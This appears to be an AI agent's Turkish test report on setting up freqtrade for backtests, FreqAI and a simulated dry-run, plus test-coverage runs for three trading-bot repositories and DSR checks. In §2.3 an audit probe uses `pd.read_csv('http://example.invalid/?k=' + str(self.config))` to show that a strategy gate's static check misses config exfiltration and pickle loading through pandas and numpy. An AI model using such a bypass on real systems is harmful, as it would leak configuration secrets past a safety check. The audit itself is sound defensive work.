# Görev 6 — Çalışma testi: freqtrade kurulumu, herkese açık veriyle backtest/FreqAI/dry-run ve parçaların testleri

Tarih: 15 Kasım 2026 · Ortam: bulut konteyneri (Linux 6.18, 4 vCPU, 16 GB RAM, 30 GB boş disk, sistem Python 3.13, venv'lerde 3.12.3, `uv`). Önceki raporlar: `gorev4_parca_katalogu.md` (bu dalda) ve `gorev5_degerlendirme_yontemi.md` (`origin/claude/charming-hawking-ab5w5q` dalında; yalnızca `git show` ile okudum, bu dala eklemedim).

Önceki raporlarda her şey kod okumasıydı. Bu raporda ilk kez bir şeyler **çalıştırıldı**. Her adımda komut, süre, sonuç ve hata var. Süre/bellek sayıları tek koşudur, tekrar edilmedi.

## 0. Güvenlik notu (talimatla ilgili bir sapma)

Talimatta "konteynerde hiçbir API anahtarı yok" denmişti. `env | grep` (değerleri gizleyerek) **oturum altyapısına ait kimlik bilgisi değişkenleri** gösterdi: `GH_TOKEN`, `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY`, `CLOUDSDK_AUTH_ACCESS_TOKEN` ve benzerleri (isimleri gördüm, değerleri yazdırmadım). Bunlar borsa veya LLM anahtarı değil, ama indirilen/üçüncü taraf kodun (freqtrade, üç repo) ortamında olmamalı. Bu yüzden **her kurulum ve çalıştırma `env -i` ile temizlenmiş ortamda yapıldı**: yalnızca `PATH`, `HOME` (geçici klasör), proxy ve CA paketi değişkenleri geçirildi. Hiçbir borsa/LLM anahtarı oluşturulmadı veya istenmedi, hiçbir hesaba girilmedi, hiçbir gerçek emir gönderilmedi; `exchange.key/secret` boş. Tüm dosyalar (venv, klonlar, veri, DB) oturumun geçici klasöründe; repoya yalnızca bu rapor eklendi.

Bu ortamda ayrıca: `api.binance.com` ve `fapi.binance.com` **HTTP 451** ("restricted location") veriyor, `stream.binance.com:9443` (WebSocket) bağlanmıyor. Çalışan tek yol: Binance'in herkese açık piyasa verisi aynası `data-api.binance.vision` (REST) ve `data.binance.vision` (arşiv). Sonuçlar bu yüzden **spot** veridir; vadeli işlem (futures) verisi (funding, mark price) bu ortamdan alınamadı.

## 1. freqtrade'in kurulumu ve çalıştırılması

### 1.1 Kurulum
| | |
|---|---|
| Komut | `uv venv --python 3.12 .venv` + `uv pip install freqtrade` (resmî PyPI paketi) |
| Süre | venv 0,4 sn; kurulum **8,4 sn** (PyPI erişimi hızlıydı) |
| Sonuç | **freqtrade 2026.10**, ccxt 4.5.92, pandas 3.1.1, numpy 2.5.4, scipy 1.18.1, ta-lib 0.8.3, Python 3.12.3. `ta-lib` hazır tekerlek (wheel) olarak geldi, C kütüphanesi derlemek gerekmedi |
| Hata | yok. Python 3.13 ile denemedim |
| Disk | venv 595 MB; FreqAI için `scikit-learn`, `lightgbm`, `xgboost` eklenince **992 MB** (yalnızca xgboost 84 MB) |

FreqAI için ek paketler (`scikit-learn lightgbm datasieve joblib`) ayrıca kuruldu; `datasieve` zaten bağımlılıktı. **`xgboost` da gerekti** (bkz. 1.5).

### 1.2 Erişim sorunu ve çözümü (kurulum zorluğu)
1. `freqtrade list-markets` → `ExchangeNotAvailable ... GET data-api.binance.vision/api/v3/exchangeInfo`. Sebep: ccxt'nin aiohttp'si proxy ortam değişkenlerini kendiliğinden kullanmıyor. Çözüm: `exchange.ccxt_async_config: {"aiohttp_trust_env": true}` (+ `ccxt_config` içinde aynı).
2. Sonra: `GET https://fapi.binance.com/fapi/v1/exchangeInfo 451`. freqtrade'in Binance sınıfı ccxt'nin üç piyasa türünü (spot, linear, inverse) yüklüyor. Çözüm: `ccxt_config.options = {"fetchMarkets": ["spot"], "defaultType": "spot"}` (hem `ccxt_config` hem `ccxt_async_config` içinde).
3. API adresi: `ccxt_config.urls.api.public/private/v1 → https://data-api.binance.vision/...`.
4. `list-markets` yine `ticker/24hr` yüzünden hata verdi (`NetworkError`, 5 deneme), ama `download-data` ve backtest için gerekmedi.
5. Config şeması: `api_server` bloğu varsa `listen_ip_address`, `username`, `password`, `jwt_secret_key` zorunlu; yalnızca `{"enabled": false}` yazmak hata verir (bloğu hiç yazmamak çözüm).

Bu çözümler "Binance bölge engeli + proxy" ortamına özgü; normal bir VPS'te `exchange.name: binance` yeterli olur.

### 1.3 Veri indirme
| | |
|---|---|
| Komut | `freqtrade download-data --config config_dl.json --days 185 -t 1h 5m --pairs BTC/USDT ETH/USDT SOL/USDT` |
| Süre | **15,6 sn** |
| Sonuç | 6 dosya (3 pair × 2 zaman dilimi), 2026-05-14 → 2026-11-15. Her pair için **4.451 adet 1h** ve **53.421 adet 5m** mum. Toplam **4,2 MB** (feather) |
| Hata | yok; ilk iki denemede 1.2'deki yapılandırma hataları vardı |

### 1.4 Örnek strateji backtest (`SampleStrategy`, freqtrade'in kendi şablonu)
Komut: `freqtrade new-strategy --strategy SampleStrategy`, sonra `freqtrade backtesting --strategy SampleStrategy --timeframe {5m|1h} --timerange 20260515- --export none --cache none`. Ücret varsayılan, spot, 3 pair, 1000 USDT, `max_open_trades 3`, `stake 100`.

| Zaman dilimi | Süre | Tepe RAM | İşlem | Sonuç | Sharpe (kapanan işlemler) | Piyasa değişimi |
|---|---|---|---|---|---|---|
| 5m (~53 bin mum/pair) | **13,6 sn** (CPU 11,8 sn) | **707 MB** | 182 (0,99/gün) | −%11,35 (886,5 USDT) | −3,04 | −%20,12 |
| 1h (~4,4 bin mum/pair) | **6,4 sn** | **506 MB** | 67 | −%10,31 | −2,29 | −%19,36 |

Çalıştı, hata yok. `SampleStrategy` bir gösterim stratejisidir; kâr beklenmiyordu. Not: bu sonuç çok düşen bir piyasada (−%20) çıktı ve bir edge kanıtı değildir.

### 1.5 FreqAI örneği (`FreqaiExampleStrategy` + `LightGBMRegressor`)
Strateji paketten kopyalandı (`freqtrade/templates/FreqaiExampleStrategy.py`). **Tek değişiklik:** `can_short = True → False` (şablon vadeli içindir; spot'ta çalıştırmak için). Wheel içinde örnek FreqAI config'i yoktu; `freqai` bloğunu dokümandan yazdım: `train_period_days 15`, `backtest_period_days 7`, `include_timeframes ["5m","1h"]`, korelasyon pair'leri BTC+ETH, `label_period_candles 24`, `include_shifted_candles 2`, `indicator_periods_candles [10,20]`, `n_estimators 200` (örnekte 800), `use_SVM_to_remove_outliers false` (hız için), `principal_component_analysis false`.

| Deneme | Komut/sonuç |
|---|---|
| 1. koşu | `freqtrade backtesting --freqaimodel LightGBMRegressor --timerange 20261101-20261115` → **hata:** `Impossible to load FreqaiModel 'LightGBMRegressor'. This class does not exist or contains Python code errors.` Gerçek neden günlükte: `No module named 'xgboost'`. freqtrade `prediction_models` altındaki **tüm** modelleri import ediyor; LightGBM istesek bile eksik xgboost yüklemeyi bozuyor. Hata mesajı yanıltıcı. |
| 2. koşu (xgboost kuruldu, 10 sn) | **başarılı:** 22,3 sn, CPU 61 sn, **tepe RAM 1.053 MB**; 2 eğitim penceresi × 3 pair = 6 model; her model ~2 sn (254 özellik, ~2.860 eğitim noktası); `DI tossed 592 predictions` (DI eşiği çok tahmin atmış); **1 işlem**, −%0,05, "Sharpe (closed trades) −100" (tek işlem, anlamsız) |

Sonuç: **FreqAI boru hattı çalışıyor**, ama sadece mekanik doğrulandı: 2 haftalık tek test penceresi, bir işlem, kazanç/kayıp hakkında hiçbir şey söylemez. Eğitilen modeller `user_data/models/g6-test/` (408 KB).

### 1.6 lookahead-analysis ve recursive-analysis
| Komut | Süre/RAM | Sonuç |
|---|---|---|
| `lookahead-analysis --strategy SampleStrategy --timeframe 1h --timerange 20260801-20261115 --minimum-trade-amount 10 --targeted-trade-amount 20` | 10,1 sn / 556 MB | **"no bias detected"** (20 sinyal) |
| Aynısı, kasıtlı yanlı strateji `BiasedTest` (`dataframe["close"].shift(-1)` ile giriş) | 9,0 sn / 513 MB | **"bias detected!"**: `fut` ve `enter_long` sütunlarında; tabloda `has_bias=Yes`, `biased_indicators=fut, enter_long` (dikkat: `biased_entry_signals` 0 görünüyor, sızıntı gösterge sütunu olarak bildiriliyor) |
| `recursive-analysis --strategy SampleStrategy --timeframe 1h --timerange 20260801-20261115` | 6,6 sn / 497 MB | Çalıştı. Yalnızca BTC/USDT kullanıyor. Başlangıç mumu 30 (stratejide) ile 199/399/499/999/1999 karşılaştırılıyor: `adx` göstergesi 30 mumda **%23,27** farklı (199'dan itibaren ≈ %0); `rsi` −%4,46; `tema` %0,006. Yani örnek stratejinin `startup_candle_count = 30` değeri yetersiz |

Bu iki komut agent-to-earn'ün `gate.py`'sinin kullandığı araçlarla aynı (`lookahead-analysis`). **Gerçekten çalışıyor ve bilerek koyulan sızıntıyı yakalıyor**; bu, kapının güvenilir bir parçası olduğunu doğrular (ama yalnızca bu tür sızıntıyı).

### 1.7 Dry-run (anahtarsız)
| Deneme | Sonuç |
|---|---|
| A. `freqtrade trade --dry-run --strategy SampleStrategy` (varsayılan ayarlarla) | Bot başladı ama `Changing state to: STOPPED` — **varsayılan `initial_state` "stopped"** (Telegram/API yoksa hiçbir şey yapmaz). Çözüm: config'e `"initial_state": "running"` |
| B. Aynısı `running` ile | Başladı; birkaç saniye sonra `ccxt.base.errors.NetworkError: Cannot connect to host stream.binance.com:9443` (WebSocket engelli); her pair için `exchange_ws - ERROR - Exception in continuously_async_watch_ohlcv`. Çözüm: `exchange.enable_ws: false` (REST'e dönüyor) |
| C. WS kapalı (`SampleStrategy`, 5m, 3 pair, `StaticPairList`, stake 100 USDT, api_server kapalı), 780 sn `timeout -s INT` | **11:54:19 → 12:07:12 (≈13 dk) hatasız çalıştı**: 0 uyarı, 0 hata; `SIGINT` ile düzgün kapandı (`Cleaning up modules`, `Cleaning up rpc modules`); SQLite DB oluştu (94 KB); **0 işlem, 0 emir**: `SampleStrategy`'nin RSI<30 koşulu bu 13 dakikada hiç oluşmadı. Yani "bot döngüsü çalışıyor" doğrulandı, **emir simülasyonu bu koşuda sınanmadı**. (RAM ölçümü alınamadı: ölçüm sargısı SIGINT'te kesildi.) |
| D. Emir yolu için ek sınama: her mumda giriş yapan sahte `DryProbe` stratejisi (1m, yalnızca bu test) | D. Emir yolu için ek sınama: sahte `DryProbe` stratejisi (yalnızca bu test için yazdım; 1m, her mumda giriş, ROI ile ~2 dk sonra çıkış, 3 pair, 100 USDT/işlem). **D1:** ilk sürümde `exit_long=1` de verdiğim için freqtrade girişleri yok saydı (debug günlüğü: `entry trigger ... enter=True` ama `Found no enter signals`); 4 dk, 0 işlem — kendi hatam, ama freqtrade'in aynı mumda giriş+çıkış sinyalini sessizce girişi iptal ederek çözdüğünü gösteriyor. **D2:** düzeltince `Unable to create trade ... fetch_ticker() returned exception: Could not load ticker due to NetworkError` (5 dakikada **900 uyarı**, 0 işlem). Kök neden: freqtrade emir fiyatını **senkron** ccxt ile (`requests`) alıyor ve bu proxy ortam değişkenini kullanmıyor (async/aiohttp kısmı `aiohttp_trust_env` ile çalışıyor; mum verisi bu yüzden iniyordu). Ayrı küçük ccxt denemesi bunu doğruladı: senkron `fetch_ticker` varsayılanda hata, `httpsProxy` verilince başarılı. **D3:** `exchange.ccxt_config.httpsProxy` (yerel proxy adresi) eklenince 12:20:16–12:25:16 (5 dk) çalıştı: **6 işlem açıldı, 4'ü kapandı** (hepsi `roi`, −%0,09…−%0,18: spread+ücret), **10 emir** (4 alış dolu, 2 alış açık, 4 satış dolu), limit emirler ticker fiyatından doldu, **0 uyarı / 0 hata**, SIGINT ile temiz kapanış. Yani **anahtarsız dry-run emir yolu çalışıyor** (gerçek emir gitmedi; tamamen simülasyon). |

### 1.8 freqtrade kısmının özeti
Çalışan: kurulum, veri indirme, backtest (5m/1h), FreqAI eğitimi + backtest, lookahead-analysis (pozitif ve negatif kontrol), recursive-analysis, dry-run döngüsü. Zorluklar: bölge engeli (451/WS), proxy + aiohttp (async) ve proxy + `requests` (senkron ccxt, dry-run emir fiyatı), yanıltıcı FreqAI hata mesajı (`xgboost`), `initial_state` varsayılanı.

## 2. Parçaların testleri

Kurulum betiklerini önce okudum: guarded-trader için `Makefile`/`pyproject.toml`/`uv.lock` (uv, yalnızca PyPI kaynakları, 11 paket); agent-to-earn için `Makefile`, `docker/Dockerfile.tools` (resmî `freqtradeorg/freqtrade:2026.9` imajı + pytest 8.3.5 + pytest-cov 6.1.1 + **Claude Code CLI**; bunu kurmadım), `pytest.ini`, `tests/conftest.py`; regime-trading-bot için `requirements.txt`, `pytest.ini`, `.github/workflows/test.yml`. Hiçbir kurulum betiği çalıştırılmadı; paketleri `uv pip install` ile ayrı venv'lere kurdum. Klonlar `--depth 50`: guarded-trader `2b4e839` (2026-11-14), agent-to-earn `ca2f47b` (2026-11-13), regime-trading-bot `508d7d9` (2026-10-21).

### 2.1 Özet tablo
| Repo / kapsam | Çalıştırılan | Geçti | Kaldı / hata | Süre | Kapsam (satır+dal) |
|---|---|---|---|---|---|
| aplicy-com/guarded-trader `services/research` | `uv run --frozen pytest` | **47** | 0 | 8,2 sn | `dsr.py` **%100**, `null.py` **%98**, `registry.py` **%97**, `walkforward.py` **%95**, `metrics.py` %99, `round2/engine.py` %94, `round2/strategies.py` %96; **`cli.py` %19, `ft_runner.py` %0**, `round2/run.py` %66, `round2/prereg.py` %59; toplam %69 |
| Bachhsunkid/agent-to-earn | `pytest` (freqtrade 2026.9 venv'inde) | **203** (ilk denemede toplama hatası, bkz. 2.3) | 0 | 2,8 sn | **`agent/gate.py` %99** (272 satır, 1 kaçan), **`guarded_strategy.py` %98**, `common.py` %97, `bt.py` %95, `readiness.py` %96, `notify.py` %91; toplam %98 |
| danny123-sudo/regime-trading-bot `core` | `pytest` (CI'daki bağımlılıklarla, freqtrade yok) | **96** | 0 | 1,2 sn | `adaptive.py` **%72**, `council.py` %88, `features.py` %97, `indicators.py` %93, `levers.py` %94, `regime.py` %87, `settings.py` %94; **`grok_agent.py` %0, `strategy_state.py` %0, `sentiment.py` %0, `skiplog.py` %0**; core toplamı %62 |

Kapsam ölçümü için `coverage`/`pytest-cov`'u geçici venv'lere kurdum (depodaki dosyalara dokunulmadı).

### 2.2 guarded-trader (özellikle dsr.py, null.py, registry.py, walkforward.py)
- 47 testin hepsi geçti; dağılım: `test_dsr.py` 6, `test_metrics.py` 7, `test_round2_engine.py` 19, `test_round2_prereg.py` 2, `test_round2_run.py` 1, `test_walkforward_null_registry.py` **12** (gorev4'te "10" demiştim; düzeltildi).
- **Testler istenen modülleri gerçekten kapsıyor**: dsr %100, null %98, registry %97, walkforward %95 (dal kapsamı dahil). Kapsanmayan: `null.py:56`, `registry.py:148`, `walkforward.py:50` gibi tek satırlar. Kapsanmayanlar asıl iş yükü olan `ft_runner.py` (%0, gerçek freqtrade backtest'i yapıyor, "ağsız sandbox"ta çalışması tasarlanmış) ve `cli.py` (%19). Yani istatistik çekirdeği iyi sınanmış, **freqtrade'e bağlayan yapıştırıcı sınanmamış**.
- `uv run --frozen`: 11 paket 19 ms'de kuruldu (önbellekten), yeni `.venv` klonun içinde oluştu. Conductor testlerini (537 test iddiası) bu görevde çalıştırmadım.
- Hata/uyarı yok.

### 2.3 agent-to-earn (gate.py, guarded_strategy)
- **İlk deneme: toplama hatası.** `pytest` → `ModuleNotFoundError: No module named 'yaml'` (`tests/test_public.py:7`). Resmî `Dockerfile.tools` yalnızca pytest/pytest-cov ekliyor; `pyyaml`'ın `freqtradeorg/freqtrade` imajında bulunduğu varsayılıyor. PyPI'den kurulan `freqtrade` bunu getirmiyor. `pyyaml` kurulunca 203 test geçti. Yani depo "tek komut" ile PyPI'den çalışmaz; docker imajı varsayımı gizli bağımlılık.
- `tests/test_gate.py` **70** test, `tests/test_guarded_strategy.py` **63** test (parametrik açılımlarla; gorev4'te "~50" ve "~25" demiştim, düzeltildi).
- `gate.py` %99, `guarded_strategy.py` %98 kapsıyor. **Ama testlerin neyi kapsadığına dikkat:** `tests/conftest.py` sahte `FakeDataProvider`, `FakeWallets`, `FakeTrade` kullanıyor; `gate.py` testlerinde `common.backtest`, `run_tools`, `lookahead` vb. `monkeypatch` ile taklit ediliyor. Yani **gerçek bir freqtrade backtest veya lookahead-analysis hiç çalıştırılmıyor**; kapı mantığı (karar ağacı) sınanıyor, "freqtrade ile entegrasyon" sınanmıyor. Gerçek `lookahead-analysis` komutunu ben ayrı çalıştırdım (1.6) ve çalıştı.
- **gorev4'teki iki bulguyu çalıştırarak doğruladım** (kodu çalıştırmadan, yalnızca `gate` modülünün iki fonksiyonunu girdilerle çağırarak; aday strateji kodu hiç yürütülmedi):
  1. `gate.static_check(...)`, içinde `pd.read_csv("http://example.invalid/?k=" + str(self.config))`, `dataframe.to_pickle(...)`, `np.load(..., allow_pickle=True)` bulunan bir `GuardedStrategy` adayını **hatasız** geçirdi: çıktı `ProbeCandidateV1 []` (ihlal listesi boş). Yani AST izin listesi pandas/numpy üzerinden dosya/ağ erişimini yakalamıyor.
  2. `gate.beats_incumbent(candidate, None)` → `[]` (karşılaştırma atlanır). Mevcut stratejinin backtest'i patlarsa aday yalnızca mutlak ölçütlere göre geçer (testle de sabit: `test_incumbent_oos_backtest_failure`).
  Bunlar testlerin %99 kapsamına rağmen duran açıklar: kapsam doğruluğu garanti etmiyor, tasarım boşluğu başka bir şey.

### 2.4 regime-trading-bot (core testleri)
- 96 test, hepsi geçti. Dağılım: `test_adaptive.py` 21, `test_council.py` 21, `test_indicators.py` 16, `test_regime.py` 15, `test_features.py` 12, `test_executor_symbols.py` 11.
- **Testler, gorev4'te işaret ettiğim asıl riskli kısımları kapsamıyor:** `core/grok_agent.py` (LLM vetosunun JSON sözleşmesi, `_validate`, fail-closed dalları), `core/strategy_state.py` (`confirm_entry`) ve `core/sentiment.py` kapsamı **%0**; `skiplog.py` %0. Yani "LLM'in canlı karara girdiği yol" tamamen testsiz. `adaptive.py` %72: imza/yasak anahtar/sınır/bekleme/geri alma sınanmış; `process_proposal` içinde `evaluator` bağlı olmayan dal (`:241`, "evaluator yok → yalnızca sınırla uygula") ve bazı hata dalları sınanmamış.
- `.github/workflows/test.yml` yalnızca `numpy pandas pytest pytest-asyncio python-dotenv aiohttp` kuruyor (freqtrade yok): CI'da **`user_data/strategies/*.py` hiç import edilmiyor**; `requirements.txt` ise `freqtrade>=2026.7` istiyor. Yani CI yeşil olması stratejilerin freqtrade altında çalıştığını göstermez. Ben de strateji dosyalarını bu görevde çalıştırmadım (kapsam dışı: "yalnızca testlerini çalıştır").
- `pytest-asyncio` "asyncio_default_fixture_loop_scope unset" uyarısı verdi (zararsız, ileride sürüm uyumsuzluğu çıkarabilir).

## 3. dsr.py'nin küçük bir örnekle çalıştırılması

Yöntem: `research_harness.dsr` (guarded-trader, `.venv` içinde; `python -I`, saf fonksiyonlar). 56 günlük getiri serisi: standart normal gürültü örneklemde ortalama 0/sd 1'e standartlaştırıldı, sonra günlük sd = %1 ve ortalama = (2/√365)×sd eklendi → **örnek yıllık Sharpe tam 2,000** (√365 ile yıllıklandırma, kripto 7/24). Rastgelelik tohumları 1 (normal), 2 (Student-t, 4 sd, kalın kuyruk) ve her biri için 200 tohum. DSR'nin gerektirdiği "denemeler arası Sharpe sapması" (σ) için gorev5'in örneğindeki varsayımı aldım: **yıllık 0,5** (günlük 0,5/√365 = 0,0262). Bu varsayım sonuçları doğrudan belirler (3.3'e bakın).

### 3.1 Sonuç (tohum 1, normal; çarpıklık −0,28, basıklık 4,00)
| Ölçü | dsr.py çıktısı | gorev5 "kendi hesabı" |
|---|---|---|
| Yıllık Sharpe'ın standart hatası | **2,62** | ≈ 2,55 |
| PSR (sıfıra karşı) | **0,777** | ≈ 0,77 (t ≈ 0,78) |
| MinTRL (sıfıra karşı, %95) | **257 gün** (kalın kuyruklu seride 276) | SR 2 için ≈ 0,7 yıl ≈ 250 gün |
| E[max SR] N=10 / 50 / 200 (yıllık, σ=0,5) | 0,79 / 1,14 / 1,38 | — |
| **DSR N=10** | **0,678** | (T=56 için verilmemiş) |
| **DSR N=50** | **0,629** | — |
| **DSR N=200** | **0,593** | — |
| MinTRL, E[max]'a karşı N=10 / 50 / 200 | 698 / 1.380 / 2.690 gün | — |

200 tohum: normal getirilerde PSR ortalama 0,780 (sd 0,003); DSR N=10: 0,680 (0,674–0,688), N=50: 0,630 (0,626–0,636), N=200: 0,594 (0,591–0,598). Student-t (kalın kuyruk): PSR 0,779 (sd 0,011); DSR N=10: 0,680 (0,653–0,704), N=50: 0,630 (0,610–0,648), N=200: 0,594 (0,579–0,608). Örnek Sharpe sabitlendiği için yayılma küçük; çarpıklık/basıklık değişimi yalnızca ±0,03 etki yapıyor.

### 3.2 gorev5 ile karşılaştırma
| Rakam | gorev5 | Bu çalışma (dsr.py) | Uyum |
|---|---|---|---|
| MinTRL SR 1 / 1,5 / 2 (normal, c=0, %95) | 990 / 440 / 250 gün | **990 / 441 / 249** gün | ✅ |
| MinTRL, SR 2'nin SR 1'den iyi olduğunu göstermek | ≈ 993 gün | **994** gün | ✅ |
| 56 gün, ölçülen SR 2: PSR(c=0) | ≈ 0,77 | **0,777** | ✅ |
| 56 gün, yıllık SR'ın SE'si | ≈ 2,55 | 2,62 (dsr.py, çarpıklık/basıklık dahil, T−1); normal/analitik 2,58 | ≈ (fark T ile T−1 ve moment düzeltmesinden) |
| E[max] birim varyans N=10/50/100/1000 | 1,58 / 2,28 / 2,53 / 3,26 | **1,57** / 2,28 / 2,53 / 3,26 | ✅ (N=10'da 0,01 fark; yuvarlama) |
| DSR örneği: T=365, SR 2, çarpıklık −0,5, basıklık 10, σ yıllık 0,5; PSR | ≈ 0,97 | **0,973** | ✅ |
| Aynı örnek, DSR N=10 / 50 / 200 | 0,88 / 0,80 / 0,72 | **0,878 / 0,797 / 0,724** (dsr.py: paydada gözlenen SR kullanıyor) | ✅ |
| gorev5 §"Doğrulanması gerekenler" (1): paydada SR mi SR0 mı? | açık soru | Paydada SR0 kullanan varyantı da hesapladım: 0,884 / 0,801 / 0,726 → fark ≤ 0,006 | pratikte önemsiz |

Yani gorev5'in "kendi hesabı" rakamları, guarded-trader'ın bağımsız yazılmış `dsr.py`'si ile **yuvarlama düzeyinde örtüşüyor**; iki ayrı hesap birbirini doğruluyor. (Küçük not: gorev5'te "SR0 mı gözlenen SR mı" sorusu pratikte sonucu ≤ %0,6 etkiliyor.)

### 3.3 Duyarlılık: σ varsayımı (56 gün, SR 2)
| σ (yıllık, denemeler arası Sharpe sapması) | N=10 | N=50 | N=200 |
|---|---|---|---|
| 0,25 | 0,730 | 0,707 | 0,691 |
| **0,5** (gorev5 varsayımı) | 0,678 | 0,629 | 0,593 |
| 1,0 | 0,564 | 0,458 | 0,385 |
| 2,0 | 0,331 | 0,165 | 0,089 |

PSR (N=1, deflasyon yok) = 0,777. Hangi σ kullanılırsa kullanılsın **56 günde DSR hiçbir zaman geleneksel 0,95'e yaklaşmıyor**; gorev5'in "4-8 haftalık dry-run bir edge'i doğrulayamaz" sonucu bu çalıştırmada da doğrulandı. Ayrıca `deflated_sharpe(..., n_trials, sigma_trials=None)` DSR'yi **tanımsız** (`None`) bırakıyor; σ'nın sicilden güvenilir tahmini en az iki puanlanmış deneme gerektirir (kodun belgelediği davranış).

## 4. Değerlendirme

### 4.1 Neyin çalıştığı / çalışmadığı
| | |
|---|---|
| Çalışan | freqtrade kurulumu ve backtest (saniyeler), FreqAI eğitimi/backtest (22 sn), lookahead-analysis (gerçek sızıntıyı yakalıyor), recursive-analysis, dry-run döngüsü (13 dk hatasız) ve sahte stratejiyle simüle emir yolu (6 işlem), üç reponun 346 testinin tamamı (47+203+96, hiçbiri kalmadı), `dsr.py` |
| Çalışmayan / sorunlu | Binance ana API ve WebSocket erişimi (bölge engeli) → vadeli veri yok; senkron ccxt (emir fiyatı) proxy'yi kullanmıyor → dry-run emir yolu `httpsProxy` ayarı olmadan 0 işlem; `list-markets` (ticker/24hr); FreqAI ilk koşu (xgboost eksikliği, yanıltıcı mesaj); `initial_state` varsayılanı yüzünden hareketsiz bot; agent-to-earn testleri PyPI freqtrade ile `pyyaml` olmadan toplanamıyor |
| Sınanamayan | Emir simülasyonu `SampleStrategy` dry-run'ında oluşmadı (0 işlem), yalnızca sahte `DryProbe` ile görüldü; vadeli (futures) mantığı (agent-to-earn/cryptobot hepsi futures); Conductor testleri; regime-trading-bot ve agent-to-earn stratejilerinin freqtrade altında import/backtest'i; cryptobot ve astra bu görevde çalıştırılmadı |

### 4.2 Gerçek kaynak/süre ihtiyacı (bu makinede ölçülen)
| Kalem | Değer |
|---|---|
| Makine | 4 vCPU, 16 GB RAM; hiç sıkıntı yok (en yüksek tek süreç ~1,05 GB) |
| freqtrade kurulumu | 8 sn (hazır wheel'ler); venv 595 MB, FreqAI + xgboost ile 992 MB |
| Veri | 3 pair × (1h+5m) × 185 gün = **4,2 MB**, 16 sn |
| Backtest (6 ay, 3 pair) | 5m: 13,6 sn / 707 MB; 1h: 6,4 sn / 506 MB |
| FreqAI (2 hafta test, 6 eğitim, 254 özellik) | 22 sn / 1,05 GB; model dosyaları 408 KB. Daha uzun test penceresi ve `n_estimators` 800 + SVM aykırı değer ile süre kabaca katlanır (ölçmedim) |
| lookahead / recursive | 6–10 sn / ~0,5 GB |
| Test paketleri | 1–11 sn (3 repo), venv'ler 23–91 MB |
| Dry-run | `SampleStrategy` 13 dk (0 işlem), `DryProbe` 5 dk (6 işlem); ikisinde de 0 uyarı; RAM ölçülemedi |

Toplam "dokunma süresi" (kurulum + tüm komutlar) yaklaşık 45 dakika; bunun çoğu dry-run beklemeleri (13 + 4 + 5 dk) ve engel aşma denemeleriydi. Asıl maliyet kaynak değil, **ağ erişimi ve yapılandırma**.

### 4.3 Sürpriz bulgular
1. **Ortamda kimlik bilgisi değişkenleri var** (bkz. §0): "anahtar yok" varsayımı doğru değil; temiz ortamla çalışmak zorunlu.
2. **Binance engeli üç katmanda**: REST (451), vadeli piyasa yükleme (freqtrade'in Binance sınıfı futures'ı da yüklemeye çalışıyor) ve WebSocket. `data-api.binance.vision` ile spot veri alınabiliyor.
3. **FreqAI, kullanılmayan modeller için bile paket ister** (xgboost yokken LightGBM yüklenmiyor, hata mesajı sebebi saklıyor).
4. **`initial_state` varsayılanı "stopped"**: yapılandırmayı doğru yazsanız da bot hiçbir şey yapmadan "çalışıyor" görünür.
5. **`lookahead-analysis` gerçekten çalışıyor**: kasıtlı `shift(-1)` hatası yakalandı. Ama bu araç yalnızca zaman sızıntısını görür; agent-to-earn'ün `static_check` boşluğunu (pandas ile dosya/ağ erişimi) yakalamaz.
6. **Yüksek test kapsamı ≠ güvenlik**: agent-to-earn'de `gate.py` %99 kapsanıyor ama (a) testlerin tamamı freqtrade'i taklit ediyor, (b) iki gerçek boşluk (`static_check` pandas/numpy G/Ç, `beats_incumbent(None)` fail-open) testlerle sabitlenmiş/ihmal edilmiş durumda. Çalıştırarak doğrulandı.
7. **regime-trading-bot'un riskli yolu testsiz**: `grok_agent`, `strategy_state`, `sentiment` %0; CI freqtrade bile kurmuyor.
8. **guarded-trader'ın istatistik çekirdeği olağanüstü iyi sınanmış** (%95–100) ama freqtrade'e bağlayan `ft_runner`/`cli` %0–19; ayrıca `dsr.py`, gorev5'in elle yapılmış hesabını doğruladı.
9. `recursive-analysis`, freqtrade'in kendi örnek stratejisinde bile `startup_candle_count = 30` değerinin `adx` için yetersiz olduğunu (%23 fark) gösteriyor: bu tür hataları yakalamak için aracı rutin çalıştırmak mantıklı.
10. **Dry-run emir yolu ortama bağlı bir proxy tuzağına sahip**: mum verisi (async) çalışıyor, emir fiyatı (senkron ccxt) çalışmıyor ve freqtrade yalnızca uyarı basıyor, bot "çalışıyor" görünüyor (5 dakikada 900 uyarı, 0 işlem). Ayrıca aynı mumda hem giriş hem çıkış sinyali varsa giriş sessizce iptal edilir. Ve: dry-run, 13 dakikada 0 işlemle bile "başarılı" görünür; **dry-run'ın çalıştığını anlamak için sinyal üretmeyen bir stratejiyle yetinmemek gerekiyor** (emir yolunu ayrıca sınayın).

### 4.4 "Bu parçalarla bot kurmak pratikte ne kadar zor?"
Parçalar tek tek çalışıyor ve testleri geçiyor; zorluk **entegrasyonda ve doğrulamada**:

- **Altyapı (kolay–orta):** freqtrade + veri + backtest dakikalar içinde ayağa kalkıyor; ağ engelleri (bölge/proxy) ortama bağlı bir tuzak. Bir VPS'te bu adımlar çok daha kolay olur.
- **Parçaları freqtrade'e bağlamak (orta–büyük):**
  - `guarded_strategy.py` ve `gate.py` MIT/test edilmiş ama proje-özel sabitler ve docker/`common.run_tools` varsayımları taşıyor; `pyyaml`, docker imajı, `config.live.json` gibi gizli bağımlılıklar çıktı.
  - guarded-trader `dsr/null/registry/walkforward` taşınabilir, saf ve çok iyi sınanmış (en kolay parça), ama sicil şemasını ve null'un backtest bağlantısını (`ft_runner`) kendiniz yazmalısınız (sınanmamış bölge).
  - LLM veto yolu (`grok_agent`/`strategy_state`) **hiç testlenmemiş**; her şeyi kendi test paketinizle baştan kurmanız gerekir.
- **Öğrenme döngüsü (büyük):** hiçbir parça "dry-run'da ileri test → canlıya terfi" döngüsünü hazır sunmuyor; gorev5'in gerektirdiği istatistik kapısı (DSR, null, eşleştirilmiş ikiz, ön kayıt) ancak parçalardan birleştirilip yazılabilir. Gerçek kanıt için gereken süre, hesaplarla kesinleşti: tek strateji için SR 2'de ≈ 250 gün, SR 1,5'te 441, SR 1'de 990 gün; deneme sayısı arttıkça (N=10–200) MinTRL **700–2.700 güne** çıkıyor. Yani 4–8 haftalık dry-run yalnızca **mekanik hataları** (emir yolu, maliyet, çökme, kapı mantığı) eler, edge'i değil.
